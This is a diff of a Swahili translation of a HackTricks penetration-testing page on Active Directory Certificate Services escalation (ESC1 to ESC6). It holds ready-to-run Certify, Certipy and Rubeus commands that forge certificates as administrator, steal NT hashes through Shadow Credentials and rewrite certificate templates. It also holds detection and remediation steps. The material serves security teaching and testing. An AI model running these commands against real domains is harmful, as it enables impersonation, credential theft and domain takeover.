@@ -3,7 +3,7 @@
 {{#include ../../../banners/hacktricks-training.md}}
 
 
-**Huu ni muhtasari wa sehemu za mbinu za kuongezeka zilizomo katika machapisho:**
+**Hii ni muhtasari wa sehemu za mbinu za kuinua viwango katika machapisho:**
 
 - [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
 - [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
@@ -11,34 +11,34 @@
 
 ## Misconfigured Certificate Templates - ESC1
 
-### Explanation
+### Ufafanuzi
 
-### Misconfigured Certificate Templates - ESC1 Imeelezwa
+### Misconfigured Certificate Templates - ESC1 Imefafanuliwa
 
-- **Haki za usajili zinatolewa kwa watumiaji wenye ruhusa ndogo na Enterprise CA.**
-- **Idhini ya meneja haitegemewi.**
-- **Hakuna saini kutoka kwa watendaji walioidhinishwa zinazohitajika.**
-- **Maelezo ya usalama kwenye template za cheti ni yanayoruhusu kupita kiasi, kuruhusu watumiaji wenye ruhusa ndogo kupata haki za usajili.**
-- **Template za cheti zimeundwa ili kubainisha EKU zinazorahisisha uthibitisho:**
-- Extended Key Usage (EKU) identifiers such as Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), or no EKU (SubCA) are included.
-- **Uwezo wa waombaji kujumuisha subjectAltName katika Certificate Signing Request (CSR) unaruhusiwa na template:**
-- Active Directory (AD) inatilia umuhimu subjectAltName (SAN) iliyomo kwenye cheti kwa ajili ya uthibitisho wa utambulisho ikiwa ipo. Hii ina maana kwamba kwa kubainisha SAN katika CSR, cheti kinaweza kuombwa ili kujifanya mtumiaji yeyote (kwa mfano, domain administrator). Iwapo SAN inaweza kubainishwa na muombaji inaonyeshwa katika kitu cha template cha cheti katika AD kupitia mali `mspki-certificate-name-flag`. Mali hii ni bitmask, na uwepo wa flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` unaruhusu muombaji kubainisha SAN.
+- **Haki za enrolment zinatolewa kwa watumiaji wenye ruhusa ndogo na Enterprise CA.**
+- **Idhini ya meneja haisihitajiki.**
+- **Hakuna sahihi kutoka kwa watu walioidhinishwa zinazohitajika.**
+- **Vibainisho vya usalama kwenye template za vyeti vimekuwa na upole mkubwa, zikiruhusu watumiaji wenye ruhusa ndogo kupata haki za enrolment.**
+- **Template za vyeti zimewekwa ili zifafanue EKUs ambazo zinawezesha authentication:**
+- Extended Key Usage (EKU) identifiers kama Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), au hakuna EKU (SubCA) zipo.
+- **Uwezo kwa waombaji kuongeza subjectAltName katika Certificate Signing Request (CSR) unaruhusiwa na template:**
+- Active Directory (AD) inapeana kipaumbele subjectAltName (SAN) katika cheti kwa ajili ya uthibitishaji ikiwa ipo. Hii inamaanisha kwamba kwa kubainisha SAN katika CSR, cheti kinaweza kuombwa kuiga mtumiaji yeyote (kwa mfano, domain administrator). Je, SAN inaweza kubainishwa na muombaji inaonyeshwa katika kitu cha template cha cheti katika AD kupitia mali `mspki-certificate-name-flag`. Mali hii ni bitmask, na uwepo wa flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` unaruhusu kubainishwa kwa SAN na muombaji.
 
 > [!CAUTION]
-> Muundo uliotajwa unaruhusu watumiaji wenye ruhusa ndogo kuomba vyeti na SAN yoyote walayopendelea, hivyo kuwezesha authentication kama domain principal yeyote kupitia Kerberos au SChannel.
+> Mipangilio iliyobainishwa inaruhusu watumiaji wenye ruhusa ndogo kuomba vyeti vyenye SAN yoyote ya chaguo lao, ikiruhusu authentication kama mtu yeyote wa domain kupitia Kerberos au SChannel.
 
-Kipengele hiki wakati mwingine huwezeshwa ili kusaidia uzalishaji wa haraka wa vyeti vya HTTPS au vya mwenyeji na bidhaa au huduma za deployment, au kutokana na kukosekana kwa uelewa.
+Sifa hii mara nyingine huwekwa kuwezesha uzalishaji wa haraka wa vyeti vya HTTPS au host na bidhaa au huduma za deployment, au kutokana na kutokuwa na uelewa.
 
-Inabainika kwamba kuunda cheti kwa chaguo hili kunatoa onyo, jambo ambalo halitokei wakati template ya cheti iliyopo (kama template ya `WebServer`, ambayo ina `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` imewezeshwa) inakapopiwa nakala (duplicated) na kisha kubadilishwa ili kujumuisha authentication OID.
+Inabainika kwamba kuunda cheti kwa chaguo hili kunasababisha onyo, kinachotofautiana na wakati template ya cheti iliyopo (kama `WebServer` template, ambayo ina `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` imewezeshwa) inapodondoshwa na kisha kubadilishwa kuongeza authentication OID.
 
-### Matumizi mabaya
+### Abuse
 
-Ili **kutafuta template za cheti zilizo hatarini** unaweza kutekeleza:
+Ili **kutafuta template za vyeti zilizo hatarini** unaweza kuendesha:
 ```bash
 Certify.exe find /vulnerable
 certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
 ```
-Ili **kutumia vibaya udhaifu huu kuiga msimamizi**, mtu angeweza kuendesha:
+Ili **kutumia udhaifu huu kuiga msimamizi** mtu anaweza kuendesha:
 ```bash
 # Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
 Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local
@@ -54,68 +54,68 @@ Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:ad
 certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
 -template 'ESC1' -upn 'administrator@corp.local'
 ```
-Kisha unaweza kubadilisha **cheti kilichotengenezwa kuwa `.pfx`** kwa muundo na kuitumia tena ili **kujitambulisha kwa kutumia Rubeus au certipy**:
+Kisha unaweza kubadilisha **cheti kilichotengenezwa kuwa `.pfx`** na kukitumia **kuthibitisha kwa kutumia Rubeus au certipy** tena:
 ```bash
 Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
 certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
 ```
 Binary za Windows "Certreq.exe" & "Certutil.exe" zinaweza kutumika kuunda PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee
 
-Kuorodhesha template za cheti ndani ya configuration schema ya AD Forest, hasa zile ambazo hazihitaji idhini au saini, zenye Client Authentication au Smart Card Logon EKU, na zenye flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` imewezeshwa, inaweza kufanywa kwa kukimbiza query ifuatayo ya LDAP:
+Uorodheshaji wa templates za vyeti ndani ya schema ya usanidi ya AD Forest, hasa zile ambazo hazihitaji idhini au signatures, zinazo EKU ya Client Authentication au Smart Card Logon, na zenye bendera `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` imewezeshwa, unaweza kufanywa kwa kuendesha query ya LDAP ifuatayo:
 ```
 (&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
 ```
-## Misconfigured Certificate Templates - ESC2
-
-### Explanation
-
-Senario ya pili ya matumizi mabaya ni tofautisho la ile ya kwanza:
-
-1. Haki za enrollment zinatolewa kwa watumiaji wenye ruhusa ndogo na Enterprise CA.
-2. Mahitaji ya idhini ya meneja yamezimitwa.
-3. Hitaji la saini zilizoidhinishwa limeachwa nje.
-4. Maelezo ya usalama (security descriptor) yenye ruhusa nyingi kwenye template ya cheti inawapa watumiaji wenye ruhusa ndogo haki za ku-enroll vyeti.
-5. **Template ya cheti imefafanuliwa kujumuisha the Any Purpose EKU au kutokuwa na EKU.**
-
-The **Any Purpose EKU** inaruhusu mshambuliaji kupata cheti kwa **madhumuni yoyote**, ikiwa ni pamoja na client authentication, server authentication, code signing, n.k. Mbinu ile ile inayotumika kwa ESC3 inaweza kutumika ku-exploit senario hii.
-
-Vyeti bila **EKUs**, vinavyofanya kazi kama subordinate CA certificates, vinaweza kutumika kwa **madhumuni yoyote** na pia vinaweza **kutumika kusaini vyeti vipya**. Kwa hivyo, mshambuliaji anaweza kubainisha EKUs au mashamba mengine kwa hiari katika vyeti vipya kwa kutumia subordinate CA certificate.
-
-Hata hivyo, vyeti vipya vilivyotengenezwa kwa ajili ya **domain authentication** havitafanya kazi ikiwa subordinate CA haitumiki na kitu cha **`NTAuthCertificates`**, ambacho ndilo mpangilio wa chaguo-msingi. Hata hivyo, mshambuliaji bado anaweza kuunda **vyeti vipya vyenye EKU yoyote** na thamani za cheti za kukusudia kwa hiari. Hivi vinaweza kutumiwa vibaya kwa madhumuni mbalimbali (mf., code signing, server authentication, nk.) na vinaweza kuwa na matokeo makubwa kwa programu nyingine katika mtandao kama SAML, AD FS, au IPSec.
-
-Ili kuorodhesha templates zinazolingana na senario hii ndani ya schema ya usanidi ya AD Forest, query ya LDAP ifuatayo inaweza kuendeshwa:
-```
-(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
-```
-## Templates za Enrolment Agent Zilizopangwa Vibaya - ESC3
+## Templates za Cheti zilizopangwa vibaya - ESC2
 
 ### Maelezo
 
-Mfano huu ni kama ule wa kwanza na wa pili lakini **kutumia vibaya** **EKU tofauti** (Certificate Request Agent) na **templeti 2 tofauti** (kwa hivyo ina seti 2 za mahitaji),
+Tukio la pili la matumizi mabaya ni tofauti kidogo ya la kwanza:
 
-The **Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), known as **Enrollment Agent** in Microsoft documentation, inampa principal uwezo wa **kuomba** **certificate** kwa **niaba ya mtumiaji mwingine**.
+1. Haki za usajili zinatolewa kwa watumiaji wenye vibali vidogo na Enterprise CA.
+2. Uhitaji wa idhini ya meneja umezimwa.
+3. Hitaji la saini zilizothibitishwa limeachwa.
+4. Security descriptor yenye ukomo mdogo mno kwenye template ya cheti inawapa watumiaji wenye vibali vidogo haki za usajili wa vyeti.
+5. **Template ya cheti imefafanuliwa kujumuisha Any Purpose EKU au no EKU.**
 
-The **“enrollment agent”** inasajiliwa katika templeti kama hiyo na inatumia certificate iliyopatikana **kusaini pamoja (co-sign) CSR kwa niaba ya mtumiaji mwingine**. Kisha **inatuma** **co-signed CSR** kwa CA, ikijisajili katika templeti inayoruhusu **“enroll on behalf of”**, na CA inajibu kwa kutoa **certificate** inayomilikiwa na mtumiaji **“mwingine”**.
+The **Any Purpose EKU** inaruhusu cheti kupatikana na mshambuliaji kwa **matumizi yoyote**, ikijumuisha uthibitishaji wa mteja (client authentication), uthibitishaji wa seva (server authentication), code signing, n.k. Teknikiki ile ile **used for ESC3** inaweza kutumika kuchochea tukio hili.
 
-**Requirements 1:**
+Vyeti bila **no EKUs**, ambazo hufanya kazi kama subordinate CA certificates, vinaweza kutumiwa kwa **matumizi yoyote** na pia vinaweza **kutumika kusaini vyeti vipya**. Kwa hivyo, mshambuliaji anaweza kubainisha EKUs yoyote au mashamba mengine katika vyeti vipya kwa kutumia subordinate CA certificate.
 
-- Haki za enrollment zinatolewa kwa watumiaji wenye vibali vya chini na Enterprise CA.
-- Sharti la idhini ya meneja limeachwa nje.
-- Hakuna sharti la saini zilizoidhinishwa.
-- Security descriptor ya template ya certificate ni yenye ruhusa kupita kiasi, ikitoa haki za enrollment kwa watumiaji wenye vibali vya chini.
-- Template ya certificate ina Certificate Request Agent EKU, ikiruhusu kuomba templeti nyingine za certificate kwa niaba ya principals wengine.
+Hata hivyo, vyeti vipya vilivyoundwa kwa ajili ya **domain authentication** havitafanya kazi ikiwa subordinate CA haitegemewi na kitu cha **`NTAuthCertificates`**, jambo hili likiwa mpangilio wa chaguo-msingi. Hata hivyo, mshambuliaji bado anaweza kuunda **vyeti vipya vyenye any EKU** na thamani za cheti za ubinafsi. Hizi zinaweza kutumika vibaya kwa madhumuni mbalimbali (mfano: code signing, server authentication, n.k.) na zinaweza kuwa na athari kubwa kwa programu nyingine katika mtandao kama SAML, AD FS, au IPSec.
 
-**Requirements 2:**
+Ili kuorodhesha templates zinazolingana na tukio hili ndani ya schema ya usanidi ya AD Forest, query ya LDAP ifuatayo inaweza kuendeshwa:
+```
+(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
+```
+## Templates za Enrollment Agent Zilizopangwa Vibaya - ESC3
 
-- Enterprise CA inatoa haki za enrollment kwa watumiaji wenye vibali vya chini.
-- Idhini ya meneja inapuuzwa.
-- Toleo la schema la templeti ni 1 au lina zaidi ya 2, na linaeleza Application Policy Issuance Requirement inayohitaji Certificate Request Agent EKU.
-- EKU iliyotajwa katika templeti ya certificate inaruhusu domain authentication.
-- Vizuizi dhidi ya enrollment agents havitekelezwi kwenye CA.
+### Maelezo
 
-### Abuse
+Mazingira haya ni kama ya kwanza na ya pili lakini **kutumia vibaya** **EKU tofauti** (Certificate Request Agent) na **templates 2 tofauti** (hivyo ina seti 2 za mahitaji),
 
-Unaweza kutumia [**Certify**](https://github.com/GhostPack/Certify) au [**Certipy**](https://github.com/ly4k/Certipy) kutumia vibaya tukio hili:
+The **Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), inayojulikana kama **Enrollment Agent** katika nyaraka za Microsoft, inaruhusu mhusika **kuomba** **cheti** kwa **niaba ya mtumiaji mwingine**.
+
+**“enrollment agent”** hujiandikisha katika template kama hiyo na hutumia **cheti** kinachotokana ili **kusaini pamoja CSR kwa niaba ya mtumiaji mwingine**. Kisha **hutuma** **CSR iliyosainiwa pamoja** kwa CA, ikijiandikisha katika **template** inayoruhusu “kuomba kwa niaba ya mwingine”, na CA hujibu kwa **cheti kinachomilikiwa na mtumiaji “mwingine”**.
+
+**Mahitaji 1:**
+
+- Haki za enrollment zimetolewa kwa watumiaji wenye ruhusa za chini na Enterprise CA.
+- Uthibitisho wa idhini ya meneja umeondolewa.
+- Hakuna hitaji la saini zilizothibitishwa.
+- Security descriptor ya template ya cheti ni mbaya sana kwa ruhusa, ikitoa haki za enrollment kwa watumiaji wenye ruhusa za chini.
+- Template ya cheti ina Certificate Request Agent EKU, ikiruhusu kuomba templates nyingine za cheti kwa niaba ya wahusika wengine.
+
+**Mahitaji 2:**
+
+- Enterprise CA inatoa haki za enrollment kwa watumiaji wenye ruhusa za chini.
+- Uthibitisho wa meneja unapitwa.
+- Toleo la schema ya template ni 1 au lina zaidi ya 2, na linaonyesha Application Policy Issuance Requirement inayohitaji Certificate Request Agent EKU.
+- EKU iliyotajwa katika template ya cheti inaruhusu authentication ya domain.
+- Vizuizi kwa enrollment agents havijatumika kwenye CA.
+
+### Matumizi mabaya
+
+Unaweza kutumia [**Certify**](https://github.com/GhostPack/Certify) au [**Certipy**](https://github.com/ly4k/Certipy) kutumia vibaya mazingira haya:
 ```bash
 # Request an enrollment agent certificate
 Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
@@ -129,44 +129,44 @@ certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.loca
 # Use Rubeus with the certificate to authenticate as the other user
 Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
 ```
-Watumiaji walio na ruhusa kupata cheti cha **enrollment agent**, templates ambazo **agents** wa enrollment wanaruhusiwa kujiandikisha, na **akaunti** ambazo agent wa enrollment anaweza kutenda kwa niaba yao vinaweza kuzuiwa na CAs za shirika. Hii inafanywa kwa kufungua `certsrc.msc` **snap-in**, **kubofya kulia kwenye CA**, **kubofya Properties**, kisha **kuvinjari** hadi kwenye tab ya “Enrollment Agents”.
+The **users** who are allowed to **obtain** an **enrollment agent certificate**, the templates in which enrollment **agents** are permitted to enroll, and the **accounts** on behalf of which the enrollment agent may act can be constrained by enterprise CAs. This is achieved by opening the `certsrc.msc` **snap-in**, **right-clicking on the CA**, **clicking Properties**, and then **navigating** to the “Enrollment Agents” tab.
 
-Hata hivyo, imetambuliwa kwamba mpangilio wa chaguo-msingi kwa CAs ni “**Do not restrict enrollment agents**.” Wakati marufuku kwa enrollment agents inapoamilishwa na wasimamizi kwa kuweka “**Restrict enrollment agents**,” usanidi wa chaguo-msingi unabaki kuwa wa kuruhusu mengi. Unawaruhusu **Everyone** kujiandikisha kwenye templates zote kama mtu yeyote.
+Hata hivyo, inashuhudiwa kuwa mpangilio wa **default** kwa CAs ni “**Do not restrict enrollment agents**.” Wakati ukandamizo kwa enrollment agents unapoamuliwa na wasimamizi, wakibadilisha hadi “Restrict enrollment agents,” usanidi wa default unabaki kuwa unaruhusu mno. Unamruhusu **Everyone** kupata ruhusa ya kujiandikisha kwenye templates zote kama mtu yeyote.
 
-## Vulnerable Certificate Template Access Control - ESC4
+## Udhibiti Hatarishi wa Ufikiaji wa Template ya Cheti - ESC4
 
 ### **Explanation**
 
-**Security descriptor** juu ya **certificate templates** inaelezea **permissions** ambazo **AD principals** maalum wanazo kuhusu template.
+The **security descriptor** on **certificate templates** defines the **permissions** specific **AD principals** possess concerning the template.
 
-Iwapo **mshambulizi** atakuwa na **permissions** zinazohitajika **kubadilisha** **template** na **kuanzisha** **mipangilio isiyo sahihi inayoweza kutumiwa** zilizotajwa katika **sehemu zilizotangulia**, inaweza kuwezesha kuinua haki/mamlaka.
+Iwapo **mshambuliaji** atakuwa na **permissions** zinazohitajika kubadilisha **template** na kuanzisha yoyote ya **exploitable misconfigurations** zilizoorodheshwa katika **prior sections**, inaweza kuwezesha privilege escalation.
 
-Haki muhimu zinazohusiana na template za cheti ni pamoja na:
+Permissions muhimu zinazotumika kwa certificate templates ni pamoja na:
 
-- **Owner:** Inatoa udhibiti wa msingi juu ya kitu hicho, ikiruhusu mabadiliko ya sifa yoyote.
-- **FullControl:** Inatoa mamlaka kamili juu ya kitu hicho, ikiwa ni pamoja na uwezo wa kubadilisha sifa yoyote.
-- **WriteOwner:** Inaruhusu kubadilisha mwenye umiliki wa kitu hicho kuwa kwa principal aliye chini ya udhibiti wa mshambulizi.
-- **WriteDacl:** Inaruhusu kurekebisha udhibiti wa upatikanaji (DACL), na hivyo inaweza kumpa mshambulizi FullControl.
-- **WriteProperty:** Inaruhusu kuhariri mali yoyote ya kitu hicho.
+- **Owner:** Inampa udhibiti wa ndani juu ya object, ikiruhusu urekebishaji wa sifa yoyote.
+- **FullControl:** Inaruhusu mamlaka kamili juu ya object, ikiwa ni pamoja na uwezo wa kubadilisha sifa yoyote.
+- **WriteOwner:** Inaruhusu kubadilisha owner wa object kwa principal ambaye yuko chini ya udhibiti wa mshambuliaji.
+- **WriteDacl:** Inaruhusu kurekebisha access controls, ambayo inaweza kumpa mshambuliaji **FullControl**.
+- **WriteProperty:** Inaruhusu kuhariri sifa zozote za object.
 
 ### Abuse
 
-Ili kubaini principals walio na haki za kuhariri kwenye templates na vitu vingine vya PKI, orodhesha kwa kutumia Certify:
+Ili kubaini principals wenye haki za kuhariri kwenye templates na vitu vingine vya PKI, fanya enumeration kwa kutumia Certify:
 ```bash
 Certify.exe find /showAllPermissions
 Certify.exe pkiobjects /domain:corp.local /showAdmins
 ```
-Mfano wa privesc kama ule uliotangulia:
+Mfano wa privesc kama ule uliopita:
 
 <figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>
 
-ESC4 ni pale mtumiaji anapokuwa na ruhusa za kuandika kwenye kiolezo cha cheti. Hii kwa mfano inaweza kutumika kuandika juu (overwrite) usanidi wa kiolezo cha cheti ili kufanya kiolezo kuwa dhaifu kwa ESC1.
+ESC4 ni wakati mtumiaji ana write privileges juu ya certificate template. Hii, kwa mfano, inaweza kutumiwa kuandika upya usanidi wa certificate template ili kufanya template kuwa dhaifu dhidi ya ESC1.
 
-Kama tunaona katika njia hapo juu, ni `JOHNPC` pekee anayemiliki ruhusa hizi, lakini mtumiaji wetu `JOHN` ana kiunganisho kipya cha `AddKeyCredentialLink` kwa `JOHNPC`. Kwa kuwa hii technique inahusiana na certificates, nimeitekeleza pia shambulio hili, inayojulikana kama [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Hapa kuna mtazamo mfupi wa amri ya Certipy `shadow auto` ili kupata NT hash ya mwathiriwa.
+Kama tunavyoona katika njia hapo juu, ni `JOHNPC` pekee ana haki hizi, lakini mtumiaji wetu `JOHN` ana edge mpya `AddKeyCredentialLink` kuelekea `JOHNPC`. Kwa kuwa technique hii inahusiana na certificates, nimeitumia pia shambulio hili, linalojulikana kama [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Hapa kuna kidokezo kidogo cha amri ya Certipy `shadow auto` ili kupata NT hash ya mwanaathiriwa.
 ```bash
 certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
 ```
-**Certipy** inaweza overwrite usanidi wa template ya cheti kwa amri moja. Kwa **default**, Certipy itafanya **overwrite** usanidi ili kuufanya **vulnerable to ESC1**. Tunaweza pia kubainisha **`-save-old` parameter ili kuhifadhi usanidi wa zamani**, ambayo itakuwa muhimu kwa **kurejesha** usanidi baada ya shambulio letu.
+**Certipy** inaweza kuandika upya usanidi wa template ya cheti kwa amri moja. Kwa **chaguo-msingi**, Certipy itaandika upya usanidi ili kuufanya uwe dhaifu kwa **ESC1**. Tunaweza pia kubainisha **`-save-old` parameter ili kuhifadhi usanidi wa zamani**, ambao utakuwa muhimu kwa **kurejesha** usanidi baada ya shambulio letu.
 ```bash
 # Make template vuln to ESC1
 certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old
@@ -177,37 +177,37 @@ certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target 
 # Restore config
 certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
 ```
-## Vulnerable PKI Object Access Control - ESC5
+## Udhibiti wa Upatikanaji wa Vitu vya PKI Zenye Udhaifu - ESC5
 
 ### Maelezo
 
-Mtandao mpana wa mahusiano yaliyounganishwa kwa msingi wa ACL, ambao unajumuisha vitu vingi zaidi ya certificate templates na certificate authority, unaweza kuathiri usalama wa mfumo mzima wa AD CS. Vitu hivi, ambavyo vinaweza kuathiri kwa kiasi kikubwa usalama, vinajumuisha:
+Mtandao mpana wa uhusiano unaotegemea ACL, unaojumuisha vitu kadhaa zaidi ya certificate templates na certificate authority, unaweza kuathiri usalama wa mfumo mzima wa AD CS. Vitu hivi, ambavyo vinaweza kuathiri kwa kiasi kikubwa usalama, vinajumuisha:
 
-- AD computer object ya CA server, ambayo inaweza kuathiriwa kupitia taratibu kama S4U2Self au S4U2Proxy.
+- AD computer object ya CA server, ambayo inaweza kuathiriwa kupitia mekanismu kama S4U2Self au S4U2Proxy.
 - RPC/DCOM server ya CA server.
-- Kitu chochote kilichomo chini ndani ya container maalum `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Njia hii inajumuisha, lakini sio tu, containers na vitu kama Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, na Enrollment Services Container.
+- Kila descendant AD object au container ndani ya container path maalum `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Path hii inajumuisha, lakini haizuiwi kwa, containers na vitu kama Certificate Templates container, Certification Authorities container, NTAuthCertificates object, na Enrollment Services Container.
 
-Usalama wa mfumo wa PKI unaweza kuathiriwa ikiwa mshambuliaji mwenye ruhusa ndogo atasababisha kudhibiti chochote kati ya vipengele hivi muhimu.
+Usalama wa mfumo wa PKI unaweza kuathiriwa ikiwa mshambuliaji mwenye vibali vidogo atafanikiwa kupata udhibiti wa mojawapo ya vipengele hivi muhimu.
 
 ## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6
 
 ### Maelezo
 
-Mada iliyojadiliwa katika [**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) pia inagusia athari za **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, kama ilivyoainishwa na Microsoft. Mipangilio hii, ikiwashwa kwenye Certification Authority (CA), inaruhusu ujumlishaji wa **user-defined values** katika **subject alternative name** kwa **maombi yoyote**, ikiwa ni pamoja na yale yanayotengenezwa kutoka Active Directory®. Kwa hivyo, kifungu hiki kinawezesha **mdukuzi** kuji-enzela kupitia **template yoyote** iliyosanidiwa kwa ajili ya uthibitishaji wa domain—hasa zile zilizofunguliwa kwa usajili wa watumiaji wasio na ruhusa, kama template ya kawaida ya User. Kwa matokeo, cheti kinaweza kupatikana, kuruhusu mdukuzi kuthibitisha kama domain administrator au **entity nyingine yoyote hai** ndani ya domain.
+Mada inayojadiliwa katika [**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) pia inagusa athari za bendera **`EDITF_ATTRIBUTESUBJECTALTNAME2`**, kama ilivyoelezwa na Microsoft. Mipangilio hii, inapowezeshwa kwenye Certification Authority (CA), inaruhusu ujumuishaji wa **user-defined values** katika subject alternative name kwa **maombi yoyote**, ikiwa ni pamoja na yale yaliyotengenezwa kutoka Active Directory®. Kwa hivyo, kifungu hiki kinamruhusu mdukuzi kujiandikisha kupitia template yoyote iliyowekwa kwa ajili ya domain authentication—hasa zile zinazofunguliwa kwa usajili wa watumiaji wa kawaida (unprivileged), kama User template ya kawaida. Matokeo yake, cheti kinaweza kupatikana, kumwezesha mdukuzi kuthibitisha utambulisho kama domain administrator au kitu kingine chochote kinachofanya kazi ndani ya domain.
 
-**Kumbuka**: Njia ya kuongeza **alternative names** ndani ya Certificate Signing Request (CSR), kupitia hoja `-attrib "SAN:"` katika `certreq.exe` (inayojulikana kama “Name Value Pairs”), inatofautiana na mkakati wa kuteka SANs katika ESC1. Hapa, utofauti upo katika **jinsi taarifa za akaunti zinavyojahiliwa**—ndani ya attribute ya cheti, badala ya extension.
+**Kumbuka**: Mbinu ya kuongeza **alternative names** ndani ya Certificate Signing Request (CSR), kupitia hoja `-attrib "SAN:"` katika `certreq.exe` (inayojulikana kama “Name Value Pairs”), ni **tofauti** na mkakati wa kutumiwa kwa SANs katika ESC1. Hapa, tofauti iko katika **jinsi taarifa za akaunti zinavyofungwa**—ndani ya attribute ya cheti, badala ya extension.
 
-### Abuse
+### Matumizi mabaya
 
-Ili kuthibitisha kama mipangilio imewezeshwa, mashirika yanaweza kutumia amri ifuatayo kwa `certutil.exe`:
+Ili kuthibitisha ikiwa mipangilio imewezeshwa, mashirika yanaweza kutumia amri ifuatayo na `certutil.exe`:
 ```bash
 certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
 ```
-Operesheni hii hasa inatumia **remote registry access**, hivyo njia mbadala inaweza kuwa:
+Operesheni hii hasa inatumia **remote registry access**, kwa hiyo, njia mbadala inaweza kuwa:
 ```bash
 reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
 ```
-Zana kama [**Certify**](https://github.com/GhostPack/Certify) na [**Certipy**](https://github.com/ly4k/Certipy) zinaweza kugundua mpangilio huu mbaya na kuutumia:
+Zana kama [**Certify**](https://github.com/GhostPack/Certify) na [**Certipy**](https://github.com/ly4k/Certipy) zina uwezo wa kugundua usanidi mbaya huu na kuutumia:
 ```bash
 # Detect vulnerabilities, including this one
 Certify.exe find
@@ -216,39 +216,39 @@ Certify.exe find
 Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
 certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
 ```
-Ili kubadilisha mipangilio hii, ikibidi mtu kuwa na haki za **domain administrative** au sawa, amri ifuatayo inaweza kutekelezwa kutoka kwa workstation yoyote:
+Ili kubadilisha mipangilio hii, ikiwa mtu ana haki za **domain administrative** au sawa, amri ifuatayo inaweza kutekelezwa kutoka kwa workstation yoyote:
 ```bash
 certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
 ```
-Ili kuzima usanidi huu katika mazingira yako, flag inaweza kuondolewa kwa:
+Ili kuzima konfigurisho hii katika mazingira yako, flag inaweza kuondolewa kwa:
 ```bash
 certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
 ```
 > [!WARNING]
